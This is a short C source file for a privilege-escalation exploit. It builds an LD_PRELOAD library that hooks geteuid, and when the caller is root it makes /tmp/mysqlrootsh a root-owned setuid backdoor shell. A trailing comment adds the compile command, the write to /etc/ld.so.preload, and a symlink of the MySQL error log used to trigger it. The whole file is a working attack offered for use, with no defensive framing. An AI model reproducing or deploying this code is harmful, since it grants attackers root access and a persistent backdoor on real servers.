#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define BACKDOORPATH "/tmp/mysqlrootsh"

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown(BACKDOORPATH, 0, 0);
		chmod(BACKDOORPATH, 04777);
        printf("chown and chmod done");
        /*
        when execute user is root:
        chown 0:0 $BACKDOORPATH
        chmod 04777 $BACKDOORPATH
        */
	}
	return old_geteuid();
}

/*

gcc -Wall -fPIC -shared -o privesclib.so privesclib.c -ldl

echo privesclib.so > /etc/ld.so.preload
ERRORLOG=/path/2/mysql.err
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG

when start mysql, will execute function geteuid
not work?
*/